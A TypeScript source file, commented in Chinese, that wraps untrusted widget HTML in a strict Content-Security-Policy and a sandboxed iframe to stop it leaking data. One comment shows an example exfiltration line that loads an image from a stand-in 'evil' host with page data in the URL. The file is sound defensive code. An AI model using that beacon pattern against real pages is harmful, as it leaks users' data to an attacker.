const CDNS = 'https://cdn.jsdelivr.net https://cdnjs.cloudflare.com https://unpkg.com'

// 只放行白名单 CDN 的脚本/样式/字体。图片只允许 data:/blob:,否则被注入的 widget 可以用
// new Image().src = 'https://evil/?d=...' 把页面里的数据带出去
const CSP = [
  "default-src 'none'",
  `script-src 'unsafe-inline' ${CDNS}`,
  `style-src 'unsafe-inline' ${CDNS}`,
  'img-src data: blob:',
  `font-src data: ${CDNS}`,
  "connect-src 'none'",
  "form-action 'none'",
].join('; ')

/**
 * 给 widget HTML 注入 CSP。iframe 另外使用 sandbox="allow-scripts"(不含 allow-same-origin),
 * 因此 widget 拿不到本站的 cookie、localStorage 与 API Key。
 * connect-src 'none' 禁止 widget 主动发请求(脚本只能从白名单 CDN 加载),避免它把数据外传。
 */
export function buildWidgetDoc(html: string): string {
  return `<meta http-equiv="Content-Security-Policy" content="${CSP}">${html}`
}
